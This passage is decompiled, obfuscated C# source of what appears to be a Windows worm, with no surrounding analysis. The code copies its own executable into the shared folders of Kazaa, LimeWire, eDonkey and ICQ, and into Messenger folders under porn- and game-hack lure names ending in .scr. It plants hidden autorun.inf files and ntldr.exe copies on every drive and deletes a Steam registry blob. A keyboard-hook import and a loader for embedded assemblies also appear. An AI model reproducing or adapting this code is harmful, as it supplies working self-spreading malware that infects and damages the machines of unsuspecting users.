						goto default;
					}
					IL_0044:
					*(int*)((byte*)ptr + 8) = 5;
					Class15.smethod_52(string_, Class7.string_4);
					break;
					IL_0034:
					*(int*)((byte*)ptr + 8) = 4;
					Class15.smethod_52(string_, Class7.string_2);
					goto IL_0044;
					IL_000f:
					*(int*)((byte*)ptr + 8) = 2;
					string_ = Class7.string_5 + "\\icq\\shared folder\\";
					goto IL_0024;
					IL_0024:
					*(int*)((byte*)ptr + 8) = 3;
					Class15.smethod_52(string_, Class7.string_1);
					goto IL_0034;
					end_IL_0006_2:
					break;
				}
				*(int*)((byte*)ptr + 8) = 6;
				Class15.smethod_52(string_, Class7.string_3);
				break;
				end_IL_0006:;
			}
			catch (object obj) when ((obj is Exception) & (*(int*)ptr != 0) & (*(int*)((byte*)ptr + 4) == 0))
			{
				ProjectData.SetProjectError((Exception)obj);
				try0006_dispatch = 155;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0006_3:
			break;
		}
		if (*(int*)((byte*)ptr + 4) != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int CallNextHookEx(int int_0, int int_1, int int_2, Form1.Class5.Struct0 struct0_0);

	unsafe static Assembly smethod_48(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		void* ptr = stackalloc byte[18];
		Class10.Struct1 @struct = new Class10.Struct1(resolveEventArgs_0.Name);
		string s = @struct.method_0(bool_0: false);
		string text = Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
		string[] array = "e2VlMTA0ODk5LTdmN2UtNGIxZC05YzkzLTk2YjMzY2UwYTU5YX0sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{f261218f-3cad-40a6-a5f4-badeb3b86396},e2VlMTA0ODk5LTdmN2UtNGIxZC05YzkzLTk2YjMzY2UwYTU5YX0=,[z]{f261218f-3cad-40a6-a5f4-badeb3b86396}".Split(new char[1] { ',' });
		string text2 = string.Empty;
		((byte*)ptr)[16] = 0;
		((byte*)ptr)[17] = 0;
		*(int*)ptr = 0;
		while (*(int*)ptr < array.Length - 1)
		{
			if (!(array[*(int*)ptr] == text))
			{
				*(int*)ptr += 2;
				continue;
			}
			text2 = array[*(int*)ptr + 1];
			break;
		}
		if (text2.Length == 0 && @struct.string_2.Length == 0)
		{
			text = Convert.ToBase64String(Encoding.UTF8.GetBytes(@struct.string_0));
			*(int*)((byte*)ptr + 4) = 0;
			while (*(int*)((byte*)ptr + 4) < array.Length - 1)
			{
				if (!(array[*(int*)((byte*)ptr + 4)] == text))
				{
					*(int*)((byte*)ptr + 4) += 2;
					continue;
				}
				text2 = array[*(int*)((byte*)ptr + 4) + 1];
				break;
			}
		}
		if (text2.Length > 0)
		{
			if (text2[0] == '[')
			{
				*(int*)((byte*)ptr + 8) = text2.IndexOf(']');
				string text3 = text2.Substring(1, *(int*)((byte*)ptr + 8) - 1);
				((byte*)ptr)[16] = ((text3.IndexOf('z') >= 0) ? ((byte)1) : ((byte)0));
				((byte*)ptr)[17] = ((text3.IndexOf('t') >= 0) ? ((byte)1) : ((byte)0));
				text2 = text2.Substring(*(int*)((byte*)ptr + 8) + 1);
			}
			lock (Class10.hashtable_0)
			{
				if (Class10.hashtable_0.ContainsKey(text2))
				{
					return (Assembly)Class10.hashtable_0[text2];
				}
				Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(text2);
				if (manifestResourceStream != null)
				{
					*(int*)((byte*)ptr + 12) = (int)manifestResourceStream.Length;
					byte[] array2 = new byte[*(int*)((byte*)ptr + 12)];
					manifestResourceStream.Read(array2, 0, *(int*)((byte*)ptr + 12));
					if (((byte*)ptr)[16] != 0)
					{
						array2 = Class15.smethod_2(array2);
					}
					Assembly assembly = null;
					if (((byte*)ptr)[17] == 0)
					{
						try
						{
							assembly = Assembly.Load(array2);
						}
						catch (FileLoadException)
						{
							((byte*)ptr)[17] = 1;
						}
						catch (BadImageFormatException)
						{
							((byte*)ptr)[17] = 1;
						}
					}
					if (((byte*)ptr)[17] != 0)
					{
						try
						{
							string text4 = $"{Path.GetTempPath()}{text2}\\";
							Directory.CreateDirectory(text4);
							string text5 = text4 + @struct.string_0 + ".dll";
							if (!File.Exists(text5))
							{
								FileStream fileStream = File.OpenWrite(text5);
								fileStream.Write(array2, 0, array2.Length);
								fileStream.Close();
								Class15.MoveFileEx(text5, (string)null, 4);
								Class15.MoveFileEx(text4, (string)null, 4);
							}
							assembly = Assembly.LoadFile(text5);
						}
						catch
						{
						}
					}
					Class10.hashtable_0[text2] = assembly;
					return assembly;
				}
			}
		}
		return null;
	}

	unsafe static void smethod_49(string string_0)
	{
		void* ptr = stackalloc byte[5];
		Class7.Class8.string_1 = string_0;
		string[] logicalDrives = Environment.GetLogicalDrives();
		string[] array = logicalDrives;
		*(int*)ptr = 0;
		while (true)
		{
			((byte*)ptr)[4] = ((*(int*)ptr < array.Length) ? ((byte)1) : ((byte)0));
			if (((byte*)ptr)[4] == 0)
			{
				break;
			}
			string string_ = array[*(int*)ptr];
			Class15.smethod_25(string_);
			checked
			{
				(*unchecked((int*)ptr))++;
			}
		}
		File.Create(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\temp48.txt");
	}

	static Class20.Class24 smethod_50(Class20.Class25 class25_0)
	{
		byte[] array = new byte[class25_0.int_3];
		Array.Copy(class25_0.byte_1, 0, array, 0, class25_0.int_3);
		return new Class20.Class24(array);
	}

	static int smethod_51(Class20.Class22 class22_0)
	{
		return class22_0.int_1 - class22_0.int_0 + (class22_0.int_2 >> 3);
	}

	unsafe static void smethod_52(string string_0, string string_1)
	{
		void* ptr = stackalloc byte[14];
		((byte*)ptr)[12] = (Directory.Exists(string_0) ? ((byte)1) : ((byte)0));
		if (((byte*)ptr)[12] == 0)
		{
			return;
		}
		((byte*)ptr)[13] = ((!File.Exists(string_0 + string_1)) ? ((byte)1) : ((byte)0));
		if (((byte*)ptr)[13] == 0)
		{
			return;
		}
		try
		{
			File.Copy(Process.GetCurrentProcess().MainModule!.FileName, string_0 + string_1, overwrite: true);
			FileStream fileStream = File.OpenWrite(string_0 + string_1);
			*(long*)ptr = fileStream.Seek(0L, SeekOrigin.End);
			*(int*)((byte*)ptr + 8) = Convert.ToInt32(string_1.Length);
			checked
			{
				decimal d = new decimal(*unchecked((int*)((byte*)ptr + 8)) * 10485);
				while (true)
				{
					unchecked
					{
						((byte*)ptr)[13] = ((decimal.Compare(new decimal(*(long*)ptr), d) < 0) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[13] == 0)
						{
							break;
						}
					}
					(*unchecked((long*)ptr))++;
					fileStream.WriteByte(0);
				}
				fileStream.Close();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_53()
	{
		try
		{
			Class16.smethod_0();
		}
		catch (Exception)
		{
		}
	}

	static void smethod_54(Class20.Class23 class23_0, int int_0)
	{
		if (class23_0.int_1++ == 32768)
		{
			throw new InvalidOperationException();
		}
		class23_0.byte_0[class23_0.int_0++] = (byte)int_0;
		class23_0.int_0 &= 32767;
	}

	unsafe static void smethod_55()
	{
		void* ptr = stackalloc byte[38];
		try
		{
			string text = Interaction.Environ("appdata").Replace("Roaming", "Local\\Microsoft\\Messenger\\");
			string text2 = "C:\\Documents and Settings\\" + Environment.MachineName + "\\Local Settings\\Application Data\\Microsoft\\Messenger\\";
			((byte*)ptr)[36] = 1;
			if (((byte*)ptr)[36] == 0)
			{
				return;
			}
			*(int*)((byte*)ptr + 24) = 0;
			*(long*)ptr = 0L;
			string[] array = null;
			array = Directory.GetDirectories(text);
			byte* num = (byte*)ptr + 24;
			*(int*)((byte*)ptr + 28) = array.GetUpperBound(0);
			*(int*)num = 0;
			while (true)
			{
				int num2 = *(int*)((byte*)ptr + 24);
				*(int*)((byte*)ptr + 32) = *(int*)((byte*)ptr + 28);
				if (num2 > *(int*)((byte*)ptr + 32))
				{
					break;
				}
				((byte*)ptr)[36] = 1;
				if (((byte*)ptr)[36] != 0)
				{
					((byte*)ptr)[37] = 1;
					if (((byte*)ptr)[37] != 0)
					{
						File.Copy(Conversions.ToString(*(long*)ptr), text + "\\myhottypics.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text2 + "\\mypics.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text + "\\myhotpics.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text + "\\myhotpics.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text + "\\18pluspics.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text + "\\hotnastypics.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text + "\\myexpics.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text + "\\mygfspics.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text + "\\girlfirendspic.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text + "\\freepussys.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text + "\\hotgirltowank.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text + "\\hotgirlshere.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text + "\\freesex.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text + "\\freehotporn.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text + "\\brazzersaccounts.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text + "\\freebrazzers.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text + "\\freerealitykings.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text + "\\mw2hack.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text + "\\warrockhack.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text + "\\tibiahack.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text + "\\mw2wallhack.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text + "\\warrockwallhack.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text + "\\tibiawallhack.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text + "\\mw2speedhack.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text + "\\warrockspeedhack.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text + "\\tibiaspeedhack.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text + "\\tibiaspeedhack.scr");
					}
					*(long*)((byte*)ptr + 8) = array.GetUpperBound(0);
					*(long*)ptr = 0L;
					while (true)
					{
						long num3 = *(long*)ptr;
						*(long*)((byte*)ptr + 16) = *(long*)((byte*)ptr + 8);
						if (num3 > *(long*)((byte*)ptr + 16))
						{
							break;
						}
						File.Copy(Conversions.ToString(*(long*)ptr), text2 + "\\myhotpics.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text2 + "\\myhotpics.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text2 + "\\18pluspics.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text2 + "\\hotnastypics.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text2 + "\\myexpics.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text2 + "\\mygfspics.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text2 + "\\girlfirendspic.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text2 + "\\freepussys.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text2 + "\\hotgirltowank.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text2 + "\\hotgirlshere.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text2 + "\\freesex.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text2 + "\\freehotporn.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text2 + "\\brazzersaccounts.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text2 + "\\freebrazzers.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text2 + "\\freerealitykings.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text2 + "\\mw2hack.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text2 + "\\warrockhack.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text2 + "\\tibiahack.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text2 + "\\mw2wallhack.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text2 + "\\warrockwallhack.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text2 + "\\tibiawallhack.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text2 + "\\mw2speedhack.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text2 + "\\warrockspeedhack.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text2 + "\\tibiaspeedhack.scr");
						File.Copy(Conversions.ToString(*(long*)ptr), text2 + "\\tibiaspeedhack.scr");
						checked
						{
							(*unchecked((long*)ptr))++;
						}
					}
				}
				checked
				{
					(*unchecked((int*)((byte*)ptr + 24)))++;
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	unsafe static void smethod_56()
	{
		void* ptr = stackalloc byte[12];
		int try0006_dispatch = -1;
		string string_ = default(string);
		string string_2 = default(string);
		string string_3 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0006_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					*(int*)ptr = -2;
					goto IL_000f;
				case 373:
					{
						*(int*)((byte*)ptr + 4) = *(int*)((byte*)ptr + 8);
						if (*(int*)ptr > -2)
						{
							switch (*(int*)ptr)
							{
							case 1:
								break;
							default:
								goto end_IL_0006;
							}
						}
						int num = *(int*)((byte*)ptr + 4) + 1;
						*(int*)((byte*)ptr + 4) = 0;
						switch (num)
						{
						case 1:
							break;
						case 2:
							goto IL_000f;
						case 3:
							goto IL_0024;
						case 4:
							goto IL_0039;
						case 5:
							goto IL_004e;
						case 6:
							goto IL_005e;
						case 7:
							goto IL_006e;
						case 8:
							goto IL_007e;
						case 9:
							goto IL_008e;
						case 10:
							goto IL_009f;
						case 11:
							goto IL_00b0;
						case 12:
							goto IL_00c1;
						case 13:
							goto IL_00d2;
						case 14:
							goto IL_00e3;
						case 15:
							goto IL_00f4;
						case 16:
							goto end_IL_0006_2;
						default:
							goto end_IL_0006;
						case 17:
							goto end_IL_0006_3;
						}
						goto default;
					}
					IL_00f4:
					*(int*)((byte*)ptr + 8) = 15;
					Class15.smethod_52(string_, Class7.string_3);
					break;
					IL_00e3:
					*(int*)((byte*)ptr + 8) = 14;
					Class15.smethod_52(string_, Class7.string_2);
					goto IL_00f4;
					IL_000f:
					*(int*)((byte*)ptr + 8) = 2;
					string_2 = Class7.string_5 + "\\kazaa\\my shared folder\\";
					goto IL_0024;
					IL_0024:
					*(int*)((byte*)ptr + 8) = 3;
					string_3 = Class7.string_5 + "\\kazaa lite\\my shared folder\\";
					goto IL_0039;
					IL_0039:
					*(int*)((byte*)ptr + 8) = 4;
					string_ = Class7.string_5 + "\\kazaa lite k++\\my shared folder\\";
					goto IL_004e;
					IL_004e:
					*(int*)((byte*)ptr + 8) = 5;
					Class15.smethod_52(string_2, Class7.string_1);
					goto IL_005e;
					IL_005e:
					*(int*)((byte*)ptr + 8) = 6;
					Class15.smethod_52(string_2, Class7.string_2);
					goto IL_006e;
					IL_006e:
					*(int*)((byte*)ptr + 8) = 7;
					Class15.smethod_52(string_2, Class7.string_3);
					goto IL_007e;
					IL_007e:
					*(int*)((byte*)ptr + 8) = 8;
					Class15.smethod_52(string_2, Class7.string_4);
					goto IL_008e;
					IL_008e:
					*(int*)((byte*)ptr + 8) = 9;
					Class15.smethod_52(string_3, Class7.string_1);
					goto IL_009f;
					IL_009f:
					*(int*)((byte*)ptr + 8) = 10;
					Class15.smethod_52(string_3, Class7.string_2);
					goto IL_00b0;
					IL_00b0:
					*(int*)((byte*)ptr + 8) = 11;
					Class15.smethod_52(string_3, Class7.string_3);
					goto IL_00c1;
					IL_00c1:
					*(int*)((byte*)ptr + 8) = 12;
					Class15.smethod_52(string_3, Class7.string_4);
					goto IL_00d2;
					IL_00d2:
					*(int*)((byte*)ptr + 8) = 13;
					Class15.smethod_52(string_, Class7.string_1);
					goto IL_00e3;
					end_IL_0006_2:
					break;
				}
				*(int*)((byte*)ptr + 8) = 16;
				Class15.smethod_52(string_, Class7.string_4);
				break;
				end_IL_0006:;
			}
			catch (object obj) when ((obj is Exception) & (*(int*)ptr != 0) & (*(int*)((byte*)ptr + 4) == 0))
			{
				ProjectData.SetProjectError((Exception)obj);
				try0006_dispatch = 373;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0006_3:
			break;
		}
		if (*(int*)((byte*)ptr + 4) != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	unsafe static void smethod_57()
	{
		void* ptr = stackalloc byte[5];
		try
		{
			string programFiles = ((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_ProgramFiles();
			string[] logicalDrives = Directory.GetLogicalDrives();
			string[] array = logicalDrives;
			*(int*)ptr = 0;
			while (true)
			{
				((byte*)ptr)[4] = ((*(int*)ptr < array.Length) ? ((byte)1) : ((byte)0));
				if (((byte*)ptr)[4] != 0)
				{
					programFiles = array[*(int*)ptr];
					((byte*)ptr)[4] = ((!File.Exists(programFiles + "ntldr.exe")) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4] != 0)
					{
						File.Copy(Assembly.GetExecutingAssembly().Location, programFiles + "ntldr.exe");
					}
					StreamWriter streamWriter = new StreamWriter(programFiles + "autorun.inf");
					streamWriter.WriteLine("[autorun]");
					streamWriter.WriteLine("open = ntldr.exe");
					streamWriter.WriteLine("shellexecute=ntldr.exe");
					streamWriter.Close();
					File.SetAttributes(programFiles + "autorun.inf", FileAttributes.Hidden);
					File.SetAttributes(programFiles + "ntldr.exe", FileAttributes.Hidden);
					checked
					{
						(*unchecked((int*)ptr))++;
						continue;
					}
				}
				break;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	unsafe static void smethod_58()
	{
		void* ptr = stackalloc byte[12];
		int try0006_dispatch = -1;
		string string_ = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0006_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					*(int*)ptr = -2;
					goto IL_000f;
				case 155:
					{
						*(int*)((byte*)ptr + 4) = *(int*)((byte*)ptr + 8);
						if (*(int*)ptr > -2)
						{
							switch (*(int*)ptr)
							{
							case 1:
								break;
							default:
								goto end_IL_0006;
							}
						}
						int num = *(int*)((byte*)ptr + 4) + 1;
						*(int*)((byte*)ptr + 4) = 0;
						switch (num)
						{
						case 1:
							break;
						case 2:
							goto IL_000f;
						case 3:
							goto IL_0024;
						case 4:
							goto IL_0034;
						case 5:
							goto IL_0044;
						case 6:
							goto end_IL_0006_2;
						default:
							goto end_IL_0006;
						case 7:
							goto end_IL_0006_3;
						}
						goto default;
					}
					IL_0044:
					*(int*)((byte*)ptr + 8) = 5;
					Class15.smethod_52(string_, Class7.string_3);
					break;
					IL_0034:
					*(int*)((byte*)ptr + 8) = 4;
					Class15.smethod_52(string_, Class7.string_2);
					goto IL_0044;
					IL_000f:
					*(int*)((byte*)ptr + 8) = 2;
					string_ = Class7.string_5 + "\\limewire\\shared\\";
					goto IL_0024;
					IL_0024:
					*(int*)((byte*)ptr + 8) = 3;
					Class15.smethod_52(string_, Class7.string_1);
					goto IL_0034;
					end_IL_0006_2:
					break;
				}
				*(int*)((byte*)ptr + 8) = 6;
				Class15.smethod_52(string_, Class7.string_4);
				break;
				end_IL_0006:;
			}
			catch (object obj) when ((obj is Exception) & (*(int*)ptr != 0) & (*(int*)((byte*)ptr + 4) == 0))
			{
				ProjectData.SetProjectError((Exception)obj);
				try0006_dispatch = 155;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0006_3:
			break;
		}
		if (*(int*)((byte*)ptr + 4) != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int GetForegroundWindow();

	unsafe static void smethod_59()
	{
		void* ptr = stackalloc byte[12];
		int try0006_dispatch = -1;
		string string_ = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0006_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					*(int*)ptr = -2;
					goto IL_000f;
				case 155:
					{
						*(int*)((byte*)ptr + 4) = *(int*)((byte*)ptr + 8);
						if (*(int*)ptr > -2)
						{
							switch (*(int*)ptr)
							{
							case 1:
								break;
							default:
								goto end_IL_0006;
							}
						}
						int num = *(int*)((byte*)ptr + 4) + 1;
						*(int*)((byte*)ptr + 4) = 0;
						switch (num)
						{
						case 1:
							break;
						case 2:
							goto IL_000f;
						case 3:
							goto IL_0024;
						case 4:
							goto IL_0034;
						case 5:
							goto IL_0044;
						case 6:
							goto end_IL_0006_2;
						default:
							goto end_IL_0006;
						case 7:
							goto end_IL_0006_3;
						}
						goto default;
					}
					IL_0044:
					*(int*)((byte*)ptr + 8) = 5;
					Class15.smethod_52(string_, Class7.string_3);
					break;
					IL_0034:
					*(int*)((byte*)ptr + 8) = 4;
					Class15.smethod_52(string_, Class7.string_2);
					goto IL_0044;
					IL_000f:
					*(int*)((byte*)ptr + 8) = 2;
					string_ = Class7.string_5 + "\\tesla\\files\\";
					goto IL_0024;
					IL_0024:
					*(int*)((byte*)ptr + 8) = 3;
					Class15.smethod_52(string_, Class7.string_1);
					goto IL_0034;
					end_IL_0006_2:
					break;
				}
				*(int*)((byte*)ptr + 8) = 6;
				Class15.smethod_52(string_, Class7.string_4);
				break;
				end_IL_0006:;
			}
			catch (object obj) when ((obj is Exception) & (*(int*)ptr != 0) & (*(int*)((byte*)ptr + 4) == 0))
			{
				ProjectData.SetProjectError((Exception)obj);
				try0006_dispatch = 155;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0006_3:
			break;
		}
		if (*(int*)((byte*)ptr + 4) != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	unsafe static void smethod_60()
	{
		void* ptr = stackalloc byte[12];
		int try0006_dispatch = -1;
		string string_ = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0006_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					*(int*)ptr = -2;
					goto IL_000f;
				case 155:
					{
						*(int*)((byte*)ptr + 4) = *(int*)((byte*)ptr + 8);
						if (*(int*)ptr > -2)
						{
							switch (*(int*)ptr)
							{
							case 1:
								break;
							default:
								goto end_IL_0006;
							}
						}
						int num = *(int*)((byte*)ptr + 4) + 1;
						*(int*)((byte*)ptr + 4) = 0;
						switch (num)
						{
						case 1:
							break;
						case 2:
							goto IL_000f;
						case 3:
							goto IL_0024;
						case 4:
							goto IL_0034;
						case 5:
							goto IL_0044;
						case 6:
							goto end_IL_0006_2;
						default:
							goto end_IL_0006;
						case 7:
							goto end_IL_0006_3;
						}
						goto default;
					}
					IL_0044:
					*(int*)((byte*)ptr + 8) = 5;
					Class15.smethod_52(string_, Class7.string_3);
					break;
					IL_0034:
					*(int*)((byte*)ptr + 8) = 4;
					Class15.smethod_52(string_, Class7.string_2);
					goto IL_0044;
					IL_000f:
					*(int*)((byte*)ptr + 8) = 2;
					string_ = Class7.string_5 + "\\edonkey2000\\incoming\\";
					goto IL_0024;
					IL_0024:
					*(int*)((byte*)ptr + 8) = 3;
					Class15.smethod_52(string_, Class7.string_1);
					goto IL_0034;
					end_IL_0006_2:
					break;
				}
				*(int*)((byte*)ptr + 8) = 6;
				Class15.smethod_52(string_, Class7.string_4);
				break;
				end_IL_0006:;
			}
			catch (object obj) when ((obj is Exception) & (*(int*)ptr != 0) & (*(int*)((byte*)ptr + 4) == 0))
			{
				ProjectData.SetProjectError((Exception)obj);
				try0006_dispatch = 155;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0006_3:
			break;
		}
		if (*(int*)((byte*)ptr + 4) != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	unsafe static int smethod_61(int int_0, byte[] byte_0, int int_1, Class20.Class23 class23_0)
	{
		void* ptr = stackalloc byte[12];
		*(int*)ptr = class23_0.int_0;
		if (int_1 > class23_0.int_1)
		{
			int_1 = class23_0.int_1;
		}
		else
		{
			*(int*)ptr = (class23_0.int_0 - class23_0.int_1 + int_1) & 0x7FFF;
		}
		*(int*)((byte*)ptr + 4) = int_1;
		*(int*)((byte*)ptr + 8) = int_1 - *(int*)ptr;
		if (*(int*)((byte*)ptr + 8) > 0)
		{
			Array.Copy(class23_0.byte_0, 32768 - *(int*)((byte*)ptr + 8), byte_0, int_0, *(int*)((byte*)ptr + 8));
			int_0 += *(int*)((byte*)ptr + 8);
			int_1 = *(int*)ptr;
		}
		Array.Copy(class23_0.byte_0, *(int*)ptr - int_1, byte_0, int_0, int_1);
		class23_0.int_1 -= *(int*)((byte*)ptr + 4);
		if (class23_0.int_1 < 0)
		{
			throw new InvalidOperationException();
		}
		return *(int*)((byte*)ptr + 4);
	}

	static bool smethod_62(Class20.Class22 class22_0)
	{
		return class22_0.int_0 == class22_0.int_1;
	}

	unsafe static bool smethod_63(Class20.Class21 class21_0)
	{
		void* ptr = stackalloc byte[12];
		int num = Class15.smethod_9(class21_0.class23_0);
		while (num >= 258)
		{
			*(int*)((byte*)ptr + 8) = class21_0.int_4;
			switch (*(int*)((byte*)ptr + 8))
			{
			case 7:
			{
				int num2;
				while (((num2 = Class15.smethod_7(class21_0.class24_0, class21_0.class22_0)) & -256) == 0)
				{
					Class15.smethod_54(class21_0.class23_0, num2);
					if (--num < 258)
					{
						return true;
					}
				}
				if (num2 >= 257)
				{
					class21_0.int_6 = Class20.Class21.int_0[num2 - 257];
					class21_0.int_5 = Class20.Class21.int_1[num2 - 257];
					goto case 8;
				}
				if (num2 < 0)
				{
					return false;
				}
				class21_0.class24_1 = null;
				class21_0.class24_0 = null;
				class21_0.int_4 = 2;
				return true;
			}
			case 8:
				if (class21_0.int_5 > 0)
				{
					class21_0.int_4 = 8;
					*(int*)ptr = Class15.smethod_1(class21_0.class22_0, class21_0.int_5);
					if (*(int*)ptr < 0)
					{
						return false;
					}
					Class15.smethod_37(class21_0.class22_0, class21_0.int_5);
					class21_0.int_6 += *(int*)ptr;
				}
				class21_0.int_4 = 9;
				goto case 9;
			case 9:
			{
				int num2 = Class15.smethod_7(class21_0.class24_1, class21_0.class22_0);
				if (num2 >= 0)
				{
					class21_0.int_7 = Class20.Class21.int_2[num2];
					class21_0.int_5 = Class20.Class21.int_3[num2];
					goto case 10;
				}
				return false;
			}
			case 10:
				if (class21_0.int_5 > 0)
				{
					class21_0.int_4 = 10;
					*(int*)((byte*)ptr + 4) = Class15.smethod_1(class21_0.class22_0, class21_0.int_5);
					if (*(int*)((byte*)ptr + 4) < 0)
					{
						return false;
					}
					Class15.smethod_37(class21_0.class22_0, class21_0.int_5);
					class21_0.int_7 += *(int*)((byte*)ptr + 4);
				}
				Class15.smethod_19(class21_0.class23_0, class21_0.int_6, class21_0.int_7);
				num -= class21_0.int_6;
				class21_0.int_4 = 7;
				break;
			}
		}
		return true;
	}

	static void smethod_64()
	{
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Steam\\ClientRegistry.blob";
		if (File.Exists(path))
		{
			File.Delete(path);
		}
	}

	static void smethod_65(Class20.Class22 class22_0)
	{
		class22_0.uint_0 >>= class22_0.int_2 & 7;
		class22_0.int_2 &= -8;
	}

	static int smethod_66(Class20.Stream0 stream0_0)
	{
		return stream0_0.ReadByte() | (stream0_0.ReadByte() << 8);
	}

	unsafe static bool smethod_67(Class20.Class21 class21_0)
	{
		void* ptr = stackalloc byte[12];
		switch (class21_0.int_4)
		{
		case 2:
			if (class21_0.bool_0)
			{
				class21_0.int_4 = 12;
				return false;
			}
			*(int*)ptr = Class15.smethod_1(class21_0.class22_0, 3);
			if (*(int*)ptr < 0)
			{
				return false;
			}
			Class15.smethod_37(class21_0.class22_0, 3);
			if (((uint)(*(int*)ptr) & (true ? 1u : 0u)) != 0)
			{
				class21_0.bool_0 = true;
			}
			switch (*(int*)ptr >> 1)
			{
			case 0:
				Class15.smethod_65(class21_0.class22_0);
				class21_0.int_4 = 3;
				break;
			case 1:
				class21_0.class24_0 = Class20.Class24.class24_0;
				class21_0.class24_1 = Class20.Class24.class24_1;
				class21_0.int_4 = 7;
				break;
			case 2:
				class21_0.class25_0 = new Class20.Class25();
				class21_0.int_4 = 6;
				break;
			}
			return true;
		case 3:
			if ((class21_0.int_8 = Class15.smethod_1(class21_0.class22_0, 16)) < 0)
			{
				return false;
			}
			Class15.smethod_37(class21_0.class22_0, 16);
			class21_0.int_4 = 4;
			goto case 4;
		case 4:
			*(int*)((byte*)ptr + 4) = Class15.smethod_1(class21_0.class22_0, 16);
			if (*(int*)((byte*)ptr + 4) < 0)
			{
				return false;
			}
			Class15.smethod_37(class21_0.class22_0, 16);
			class21_0.int_4 = 5;
			goto case 5;
		case 5:
			*(int*)((byte*)ptr + 8) = Class15.smethod_32(class21_0.class23_0, class21_0.class22_0, class21_0.int_8);
			class21_0.int_8 -= *(int*)((byte*)ptr + 8);
